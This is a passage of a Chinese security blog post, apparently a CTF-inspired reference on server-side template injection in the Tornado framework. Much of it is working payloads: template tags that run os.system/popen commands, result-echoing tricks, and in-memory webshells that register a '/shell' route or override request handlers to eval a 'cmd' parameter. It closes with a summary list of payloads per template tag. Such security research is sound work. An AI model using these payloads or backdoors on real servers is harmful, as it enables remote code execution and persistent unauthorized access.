+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">Template(<span class="hljs-string">&#x27;&#x27;&#x27;&#123;% set _tt_utf8 = str %&#125;&#123;% set xhtml_escape = eval %&#125;&#123;&#123;&#x27;__import__\\x28&quot;os&quot;\\x29.system\\x28&quot;id&quot;\\x29&#x27;&#125;&#125;&#x27;&#x27;&#x27;</span>).generate()<br></code></pre></td></tr></table></figure>
+<h4 id="临时代码注入">临时代码注入</h4>
+<p>再拓展一下思路，既然可以覆盖变量，那么能不能在临时代码中插入任意代码呢？显然注入任意代码要比覆盖变量实用得多。</p>
+<p>来看上文中提到一个 payload：<code>&#123;% apply __import__("os").system %&#125;id&#123;% end %&#125;</code>，它虽然可以成功执行，但其实是会报错的，不够完美：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/fa6c3caf-6fb3-4ca2-b71b-94512b575b03.png!blog#width-zoom7" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>因为 <code>os.system</code> 的返回值是 int 类型，而 <code>_tt_utf8</code> 不能接受 int 类型的参数。</p>
+<p>先来看下临时代码：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/400fc560-bd4b-491e-8526-b4b462448e25.png!blog#width-zoom7" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>可以看到，我们在 apply 后传入的 <code>__import__("os").system</code> 被原封不动地放到了 <code>_tt_append(_tt_utf8(...))</code> 里面去了，所以这里其实支持任意 python 语句，甚至不一定需要是一个函数。所以 apply 的利用方式还可以变形为：</p>
+<ol type="1">
+<li><code>&#123;% apply __import__("os").system("id") %&#125;id&#123;% end %&#125;</code>：虽然会报错但已执行命令</li>
+<li><code>&#123;% apply [__import__("os").system("id"), str][1] %&#125;id&#123;% end %&#125;</code>：能执行命令且不会报错</li>
+</ol>
+<p>看源码可知，临时代码的生成是直接往文件里写入，所以下面这种离谱的 payload 自然也是可以利用的：<br />
+<code>Template('''&#123;% set _tt_utf8 = str %&#125;&#123;% set xhtml_escape = str\n    eval("__import__('os').system('id')") %&#125;''').generate()</code></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/9b165f37-03f6-43ac-be95-3189c2e39976.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>最后我们如果仔细观察这份临时代码可以发现，使用 <code>&#123;% apply &#125;` 会创建一个新的函数叫 `_tt_apply0`，但真正的 exp 其实是在函数外面，这就说明诸如 `&#123;% function &#125;` 形式的模板很多是可以利用的，比如 `&#123;% autoescape __import__("os").system %&#125;&#123;&#123;"id"&#125;&#125;</code>。甚至像 <code>&#123;% set &#125;` 这种看起来只能用来创建变量的语法，同样有代码注入问题：
+![](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/d7749110-5db6-4348-9f43-1b5502fbff61.png!blog#width-zoom7)
+
+由于本文最后会有所有已知利用方式的总结，为避免重复这里就不放了。
+
+#### 模板文件包含
+
+我们可以通过 `&#123;%extends ... %&#125;</code>、<code>&#123;%include ... %&#125;</code> 来包含模板文件，从而执行任意 ssti 的 payload。前提是需要有可控文件，比如一个文件上传点，至于被包含的模板文件的后缀是无所谓的。</p>
+<p>测试用例：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.template<br><br>payload = <span class="hljs-string">&quot;&quot;</span><br>loader = tornado.template.Loader(<span class="hljs-string">&quot;.&quot;</span>)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;base.html&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>).write(payload)<br>loader.load(<span class="hljs-string">&quot;base.html&quot;</span>).generate()<br></code></pre></td></tr></table></figure></p>
+<p>只要 <code>any.any</code> 这个文件可控（比如文件内容是 <code>&#123;&#123;__import__("os").system("id")&#125;&#125;</code>），那么 payload 为 <code>&#123;% extends any.any%&#125;</code>，这样也可以实现 SSTI。</p>
+<h3 id="ssti-in-tornado.web.application">SSTI in tornado.web.Application</h3>
+<p>先来写个测试用例：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.ioloop<br><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> tornado.template <span class="hljs-keyword">import</span> Template<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexHandler</span>(tornado.web.RequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        tornado.web.RequestHandler._template_loaders = &#123;&#125;<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>            f.write(<span class="hljs-variable language_">self</span>.get_argument(<span class="hljs-string">&#x27;name&#x27;</span>))<br><br>        <span class="hljs-variable language_">self</span>.render(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br>app = tornado.web.Application(<br>    [(<span class="hljs-string">&#x27;/&#x27;</span>, IndexHandler)],<br>)<br>app.listen(<span class="hljs-number">8888</span>, address=<span class="hljs-string">&quot;127.0.0.1&quot;</span>)<br>tornado.ioloop.IOLoop.current().start()<br></code></pre></td></tr></table></figure>
+<p>这里需要稍微解释一下。对于 Tornado 来说，一旦 <code>self.render</code> 之后，就会实例化一个 <code>tornado.template.Loader</code>，这个时候再去修改文件内容，它也不会再实例化一次。所以这里需要把 <code>tornado.web.RequestHandler._template_loaders</code> 清空。否则在利用的时候，会一直用的第一个传入的 payload。</p>
+<p><del>（所以其实要写出一个渲染文件的 SSTI 还不是那么简单的）</del></p>
+<p>这种写法会新引入变量（只列举已知有用的）：</p>
+<ol type="1">
+<li><code>request</code>：即 <code>tornado.httputil.HTTPServerRequest</code>，下面的属性都是与 http 请求相关的</li>
+<li><code>handler</code>：<code>tornado.web.RequestHandler</code> 的示例。表示当前请求的 url 是谁处理的，比如这个代码来说，handle 就是 <code>IndexHandler</code>。它下面有很多属性可以利用。</li>
+</ol>
+<p>所以 Tornado 中，<code>tornado.httputil.HTTPServerRequest</code> 和 <code>tornado.web.RequestHandler</code> 是非常重要的类。它们拥有非常多的属性，在 SSTI 相关的知识点中，我们需要熟练掌握这些属性的作用。</p>
+<h4 id="利用-httpserverrequest">利用 HTTPServerRequest</h4>
+<p>为了方便下面把 <code>tornado.httputil.HTTPServerRequest</code> 的实例称为 <code>request</code>。</p>
+<p>注意，由于属性非常多，属性自己也还有属性。所以这部分我只列了一些我感觉会用到的属性，肯定不全，有特殊需求的话需要自行进行挖掘。</p>
+<h5 id="绕过字符限制">绕过字符限制</h5>
+<ul>
+<li><code>request.query</code>：包含 get 参数</li>
+<li><code>request.query_arguments</code>：解析成字典的 get 参数，可用于传递基础类型的值（字符串、整数等）</li>
+<li><code>request.arguments</code>：包含 get、post 参数</li>
+<li><code>request.body</code>：包含 post 参数</li>
+<li><code>request.body_arguments</code>：解析成字典的 post 参数，可用于传递基础类型的值（字符串、整数等）</li>
+<li><code>request.cookies</code>：就是 cookie</li>
+<li><code>request.files</code>：上传的文件</li>
+<li><code>request.headers</code>：请求头</li>
+<li><code>request.full_url</code>：完整的 url</li>
+<li><code>request.uri</code>：包含 get 参数的 url。有趣的是，直接 <code>str(requests)</code> 然后切片，也可以获得包含 get 参数的 url。这样的话不需要 <code>.</code> 或者 <code>getattr</code> 之类的函数了。</li>
+<li><code>request.host</code>：Host 头</li>
+<li><code>request.host_name</code>：Host 头</li>
+<li>...</li>
+</ul>
+<h5 id="回显结果">回显结果</h5>
+<ul>
+<li><code>request.connection.write</code></li>
+<li><code>request.connection.stream.write</code></li>
+<li><code>request.server_connection.stream.write</code></li>
+</ul>
+<p>例如：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw request.connection.write((<span class="hljs-string">&quot;HTTP/1.1 200 OK\r\nCMD: &quot;</span>+<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;id&quot;</span>).read()).encode()+<span class="hljs-string">b&quot;hacked: &quot;</span>)%&#125;<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/ec28df70-f52d-4f64-aab8-e4eb6e491192.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<h4 id="利用-application">利用 Application</h4>
+<p>主要用于攻击的有这几个属性：</p>
+<ul>
+<li><code>Application.settings</code>：web 服务的配置，可能会泄露一些敏感的配置</li>
+<li><code>Application.add_handlers</code>：新增一个服务处理逻辑，可用于制作内存马，后面会一起说</li>
+<li><code>Application.wildcard_router.add_rules</code>：新增一个 url 处理逻辑，可用于制作内存马</li>
+<li><code>Application.add_transform</code>：新增一个返回数据的处理逻辑，理论上可以配合响应头来搞个内存马</li>
+</ul>
+<h4 id="利用-requesthandler">利用 RequestHandler</h4>
+<p>为了方便下面把 <code>tornado.web.RequestHandler</code> 称为 <code>handler</code>。</p>
+<p>同样，由于 handler 的属性也非常多，所以这部分也只是列举一些我觉得有用的属性。</p>
+<p>需要注意的是，handler 是有 <code>request</code> 属性的，所以理论上 handler 要比 request 实用。</p>
+<h5 id="绕过字符限制-1">绕过字符限制</h5>
+<ol type="1">
+<li><code>RequestHandler.request.*</code>：参考利用 <code>HTTPServerRequest</code> 那节</li>
+<li>其他和 request 一样的方法：例如 <code>get_argument</code> 等等，就不一一列举了，可以参考官方文档</li>
+</ol>
+<h5 id="回显结果-1">回显结果</h5>
+<p>随便列一点吧：</p>
+<ul>
+<li><code>RequestHandler.set_cookie</code>：设置 cookie</li>
+<li><code>RequestHandler.set_header</code>：设置一个新的响应头</li>
+<li><code>RequestHandler.redirect</code>：重定向，可以通过 location 获取回显</li>
+<li><code>RequestHandler.send_error</code>：发送错误码和错误信息</li>
+<li><code>RequestHandler.write_error</code>：同上，被 <code>send_error</code> 调用</li>
+<li>...</li>
+</ul>
+<h5 id="内存马">内存马</h5>
+<p>Web 服务的内存马的构造一般是两个思路：</p>
+<ol type="1">
+<li>注册一个新的 url，绑定恶意的函数</li>
+<li>修改原有的 url 处理逻辑</li>
+</ol>
+<p>与此相关的 Tornado 属性：</p>
+<ol type="1">
+<li><code>RequestHandler.application</code>：即 <code>tornado.web.Application</code> 的实例。拿到这个就可以控制绝大多数 web 服务的行为。</li>
+<li><code>RequestHandler.initialize()</code>：在实例化 <code>RequestHandler</code> 的时候执行的函数（类似 <code>__init__</code>）</li>
+<li><code>RequestHandler.prepare()</code>：在准备处理请求时执行的函数</li>
+<li><code>RequestHandler.on_finish()</code>：请求处理时完毕时执行的函数（只能做无回显的 RCE 后门，因为执行这个方法的时候，连接已经关闭了）</li>
+<li>在原有路径上新增一个方法专门用于执行恶意指令：
+<ol type="1">
+<li><code>RequestHandler.get(*args: str, **kwargs: str)</code></li>
+<li><code>RequestHandler.head(*args: str, **kwargs: str)</code></li>
+<li><code>RequestHandler.post(*args: str, **kwargs: str)</code></li>
+<li><code>RequestHandler.delete(*args: str, **kwargs: str)</code></li>
+<li><code>RequestHandler.patch(*args: str, **kwargs: str)</code></li>
+<li><code>RequestHandler.put(*args: str, **kwargs: str)</code></li>
+<li><code>RequestHandler.options(*args: str, **kwargs: str)</code></li>
+</ol></li>
+<li>其他可被覆盖且处理请求是会被调用的函数</li>
+<li><code>RequestHandler.application.add_handlers</code></li>
+<li><code>RequestHandler.application.wildcard_router.add_rules</code></li>
+</ol>
+<blockquote>
+<p>通过注册新的函数构造后门</p>
+</blockquote>
+<p>那么首先很明显，通过 <code>handler.application.add_handlers</code> 即可注册一个新的 url，对应上面提到的第一种内存马构造手段：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw handler.application.add_handlers(<span class="hljs-string">&quot;.*&quot;</span>,[(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;x&quot;</span>,(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;tornado&quot;</span>).web.RequestHandler,),&#123;<span class="hljs-string">&quot;get&quot;</span>:<span class="hljs-keyword">lambda</span> x: x.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(x.get_argument(<span class="hljs-string">&quot;name&quot;</span>))))&#125;))])%&#125;<br></code></pre></td></tr></table></figure>
+<p>稍微解释一下 payload，这里我们是用简单的方式来调用 <code>add_handlers</code>：</p>
+<ol type="1">
+<li>参数第一个是 <code>host</code>，支持正则，但是有时候我们不一定知道服务监听的地址（比如容器那种），所以最好还是用 <code>.*</code></li>
+<li>第二个参数是一个可迭代对象，里面又是一个个可迭代对象。然后最里层的第一个元素是 url，第二个元素是 <code>RequestHandler</code> 实例，这里用 <code>type</code> 来实现实例化（其实就是一开始的那个 web 示例里的 <code>class IndexHandler</code>）</li>
+</ol>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/cb2456f9-2b08-4c60-b92e-2e2ddb1a3de4.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>需要注意的是，<code>add_handlers</code> 是直接在原有的 handler 列表中 <code>append</code>，并且先到先得，所以一旦添加了一个有问题的后门，就只能换一个新的路径了。</p>
+<p>理论上 <code>handler.application.wildcard_router.add_rules</code> 也可以构造内存马，反正方法一样，我就不费劲去写了。</p>
+<blockquote>
+<p>通过覆盖处理函数构造后门</p>
+</blockquote>
+<p>接下来看第二种构造手段。对于 Tornado 来说，每次请求都是一个全新的 handler 和 request，所以这种直接给 handler 绑定恶意函数的利用方式是不行的：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw handler.prepare = <span class="hljs-keyword">lambda</span> x: handler.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(handler.get_query_argument(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>))))%&#125;<br></code></pre></td></tr></table></figure>
+<p>这里稍微解释一下，Tornado 对于参数有严格的限制，例如对于这个示例来说，<code>name</code> 参数一定要有。参数可以多但不能少，为了避免影响原有的功能，就通过 name 参数来传恶意指令了，通常我会自定义一个新的参数用于接收。</p>
+<p>既然实例修改不起作用，我们可以用 <code>__class__</code> 顺藤摸瓜去修改它的类，这样修改完之后，所有新创建的实例都会自带恶意函数，在源头投毒：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw handler.__class__.prepare = <span class="hljs-keyword">lambda</span> x: handler.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(handler.get_query_argument(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>))))%&#125;<br></code></pre></td></tr></table></figure></p>
+<p>当然，这个 payload 还有两个问题：</p>
+<ol type="1">
+<li>handler 在请求结束之后自动销毁。即使保存下来，绑定恶意函数之后，payload 里的 <code>handler.write</code> 也会异常：<code>RuntimeError: Cannot write() after finish()</code>，因为对于这个 handler 来说连接已经关闭了。</li>
+<li><code>handler.get_query_argument</code> 获取的永远是绑定恶意函数时传入的参数，这样及时注册恶意函数成功，后续也没办法修改传入的参数了</li>
+</ol>
+<p>handler 既然是 <code>tornado.web.RequestHandler</code> 的实例化，那么 <code>handler.write</code> 的第一个参数必然是类中的 <code>self</code>，所以要想动态地获取当前的实例，就应该用 <code>lambda</code> 接收到的参数。答案显而易见：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw handler.prepare = <span class="hljs-keyword">lambda</span> x: x.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(x.get_query_argument(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>))))%&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/682b0773-7a85-4d8a-9657-a63b6b02501f.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>最后还需要注意一个关键的地方，<code>handler.prepare</code> 的返回值要么是 <code>Awaitable</code> 的，要么是 <code>None</code>。所以作为既能用于回显，又返回 <code>None</code> 的 <code>handler.write</code> 简直是我们旅游出门居家必备的不二之选。</p>
+<p><strong>友情提示，通过覆盖请求处理前的方法来添加后门。一旦失败，整个 web 服务就会异常，必须重启才能恢复。</strong></p>
+<p>当然啦，进一步扩展覆盖 <code>RequestHandler</code> 方法的思路，这个类下很多方法都可以用来只做一个后门。<strong>由于姿势实在是太多了，我这里就举两种例子，若有需要橘友们根据调用关系自己分析构造即可。</strong></p>
+<blockquote>
+<p>异常情况下的内存马回显</p>
+</blockquote>
+<p>既然提到了异常，上面说的都是在返回 200 状态码下的数据回显，若原本的功能因为参数异常出了问题，<code>handler.write</code> 是不会生效的，直接返回 <code>500</code>。例如我们种植好后门之后，随便获取个不存在的属性就会直接 <code>500</code>：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/d6103a67-8dae-4127-89bc-007236a4dedc.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这一点我们可以在 <code>RequestHandler._execute</code> 中找到答案，整个请求处理流程一旦出错就会走到 <code>RequestHandler._handle_request_exception</code>（这里面传输数据用的是 <code>RequestHandler.send_error</code>）。而调用 <code>RequestHandler.write</code> 不过是把数据写入 <code>_write_buffer</code> 罢了，真正返回数据给客户端的方法是 <code>RequestHandler.flush</code>，它调用的是 <code>request.connection.write</code>，也就是上面我们提到过一个非常底层的传输数据的函数，所以用这个就可以解决这个问题。把 <code>x.write</code> 换成 <code>x.request.connection.write</code>，再附带一些额外的数据即可实现一个比较完美的回显效果：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/6496ee47-9183-4435-ab70-2dfe5ce10fdd.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这样后门会更加稳定。</p>
+<p>当然我们也可以直接把异常处理的函数覆盖掉，这个时候就可以愉快地使用 <code>write</code> 了，并且利用的时候只需要指定 cmd 参数就行：<br />
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw handler.__class__._handle_request_exception=<span class="hljs-keyword">lambda</span> x,y:[x.write((<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(x.get_query_argument(<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>)))).encode()),x.finish()][<span class="hljs-number">0</span>]%&#125;<br></code></pre></td></tr></table></figure></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/c4ebcbb9-e41b-4f64-9487-52e8bcf8d59a.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>注意，上面这个技巧在 <code>500</code> 时会生效，但是 <code>404</code> 的时候是不会生效的，事实上只要是 <code>HTTPError()</code> 的错误码都没法完美地实现内存马。</p>
+<h2 id="总结">总结</h2>
+<p>已知 payload，举一反三哈：</p>
+<blockquote>
+<p><code>&#123;&#123; *expr* &#125;&#125;</code></p>
+</blockquote>
+<p>可执行任意 python 语句，不啰嗦了</p>
+<blockquote>
+<p><code>&#123;% raw *expr* %&#125;</code></p>
+</blockquote>
+<p>可执行任意 python 语句，不啰嗦了</p>
+<blockquote>
+<p><code>&#123;% apply *function* %&#125;...&#123;% end %&#125;</code></p>
+</blockquote>
+<p>上面说过了</p>
+<blockquote>
+<p><code>&#123;% set *x* = *y* %&#125;</code></p>
+</blockquote>
+<ol type="1">
+<li><code>&#123;% set _tt_buffer = [__import__("os").popen("id").read().encode()] %&#125;</code>。覆盖变量的姿势上面都说了很多了</li>
+<li><code>&#123;% set a = 1\n    return __import__("os").popen("id").read() %&#125;</code></li>
+<li><code>&#123;% set return __import__("os").popen("id").read()%&#125;</code></li>
+</ol>
+<blockquote>
+<p><code>&#123;% autoescape %&#125;</code></p>
+</blockquote>
+<ol type="1">
+<li><code>&#123;% autoescape __import__("os").system %&#125;&#123;&#123;"id"&#125;&#125;</code></li>
+<li><code>&#123;% autoescape __import__("os").system("id") %&#125;&#123;&#123;0&#125;&#125;</code></li>
+<li><code>&#123;% autoescape (lambda x: __import__("os").popen("id").read()) %&#125;&#123;&#123;0&#125;&#125;</code></li>
+<li><code>&#123;% autoescape (lambda: __import__("os").popen("id").read())()) # %&#125;&#123;&#123;0&#125;&#125;</code></li>
+<li><code>&#123;% autoescape (lambda: __import__("os").popen("id").read())())\n    ( %&#125;&#123;&#123;0&#125;&#125;</code></li>
+</ol>
+<blockquote>
+<p><code>&#123;% for *var* in *expr* %&#125;...&#123;% end %&#125;</code></p>
+</blockquote>
+<ol type="1">
+<li><code>&#123;% for i in [__import__("os").system("id")] %&#125;&#123;% end %&#125;</code></li>
+<li><code>&#123;% for i in __import__("os").popen("id").read() %&#125;&#123;&#123;i&#125;&#125;&#123;% end %&#125;</code></li>
+<li><code>&#123;% for i in [1]: _tt_buffer = [i.encode() for i in __import__("os").popen("id")]\n    for i in []%&#125;&#123;% end %&#125;</code></li>
+<li><code>&#123;% for i in [1]: return __import__("os").popen("id").read()\n    for i in []%&#125;&#123;% end %&#125;</code></li>
+</ol>
+<blockquote>
+<p><code>&#123;% from *x* import *y* %&#125;</code></p>
+</blockquote>
+<ol type="1">
+<li><code>&#123;% from os import popen %&#125;&#123;&#123; popen("id").read() &#125;&#125;</code></li>
+<li><code>&#123;% from os import popen\n    return popen("id").read() %&#125;</code></li>
+</ol>
+<blockquote>
+<p><code>&#123;% if *condition* %&#125;...&#123;% end %&#125;</code></p>
+</blockquote>
+<ol type="1">
+<li><code>&#123;% if __import__("os").system("id") %&#125;1&#123;% end %&#125;</code></li>
+<li><code>&#123;% if 1: return __import__("os").popen("id").read()\n    if 1:# %&#125;1&#123;% end %&#125;</code></li>
+</ol>
+<blockquote>
+<p><code>&#123;% import *module* %&#125;</code></p>
+</blockquote>
+<ol type="1">
+<li><code>&#123;% import os %&#125;&#123;&#123;os.popen("id").read()&#125;&#125;</code></li>
+<li><code>&#123;% import os\n    return os.popen("id").read()%&#125;</code></li>
+</ol>
+<blockquote>
+<p><code>&#123;% try %&#125;...&#123;% except %&#125;...&#123;% end %&#125;</code></p>
+</blockquote>
+<ol type="1">
+<li><code>&#123;% try : \n        return __import__("os").popen("id").read() #%&#125;&#123;%except%&#125;&#123;%end%&#125;</code></li>
+<li><code>&#123;% try : \n        1/0 # %&#125;&#123;%except :\n        return __import__("os").popen("id").read()#%&#125;&#123;%end%&#125;</code></li>
+</ol>
+<blockquote>
+<p><code>&#123;% while *condition* %&#125;... &#123;% end %&#125;</code></p>
+</blockquote>
+<ol type="1">
+<li><code>&#123;% while __import__("os").system("id") %&#125;&#123;%end%&#125;</code></li>
+<li><code>&#123;% while 1: return __import__("os").popen("id").read() #\n    while 1\n%&#125;&#123;%end%&#125;</code></li>
+</ol>
+<blockquote>
+<p><code>&#123;% whitespace *mode* %&#125;</code></p>
+</blockquote>
+<p>暂无发现可利用的 payload</p>
+<blockquote>
+<p><code>&#123;% extends *filename* %&#125;</code></p>
+</blockquote>
+<p>上面说过了</p>
+<blockquote>
+<p><code>&#123;% include *filename* %&#125;</code></p>
+</blockquote>
+<p>上面说过了</p>
+<blockquote>
+<p><code>&#123;% module *expr* %&#125;</code></p>
+</blockquote>
+<p>理论上可以利用，但是需要的条件比较苛刻。</p>
+<p>在实例化 <code>tornado.web.Application</code> 的时候就需要传入 <code>ui_modules</code> 配置。如果 <code>ui_modules</code> 的文件（<code>.py</code>）可控，那么可以直接执行任意 Python 代码。</p>
+<blockquote>
+<p><code>&#123;% block *name* %&#125;...&#123;% end %&#125;</code></p>
+</blockquote>
+<p>暂无发现可利用的 payload</p>
+<h2 id="最后">最后</h2>
+<p>其实越是支持 python 语法的模板，攻击姿势就越多。因为 python 实在是太灵活了。</p>
+<p>本文主要受前段虎符杯决赛的 python web 启发，那道题就是 Tornado 的 SSTI。由于这道题的过滤非常严格（我有理由怀疑这个过滤条件是网上搜了好多拼在一起的。。）。虽然最后题目是通过 <code>str(request)</code> 切片的方式做出来了，但是我还是想不用其他旁路的手段，来挑战一下过滤条件，过滤条件经过调整，如下：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/34a1cf65-ce14-433a-937f-4ae50941883a.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>解释一下：构造出一个 CMD，这个 CMD 经过这个 <code>all</code> 的计算后结果必须为 <code>True</code>，且 <code>eval(CMD)</code> 需要可以在 os shell 里执行 <code>id</code>（其实就是实现 RCE 啦）。</p>
+<p><strong>巧合的是，经过一周左右断断续续的尝试，正好是在 8.4 七夕的晚上成功解出了这道自己对自己发出的挑战。看着屏幕上跳出 RCE 的结果，我想这真是一种别样的浪漫。</strong></p>
+<p>我准备把这个挑战当做 OrangeKiller CTF 第 3 期的一道题。</p>
+<p>好，我们下期见！</p>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">看图写话：<br>🦅 ⬇️ ✈️ = ？<br>🌪 💥 🅿️ = ？<br>🐯 🐑 🐑 = ？</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/SecMap/">#SecMap</a>
+      
+        <a href="/tags/SSTI/">#SSTI</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SecMap - SSTI（Tornado）</div>
+      <div>https://www.tr0y.wang/2022/08/05/SecMap-SSTI-tornado/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年8月5日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年4月15日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/08/11/vscode-door/" title="利用 vscode 打造后门门中门">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">利用 vscode 打造后门门中门</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/27/OrangeKiller_CTF_2_wp/" title="OrangeKiller CTF 第 2 期题解">
+                        <span class="hidden-mobile">OrangeKiller CTF 第 2 期题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
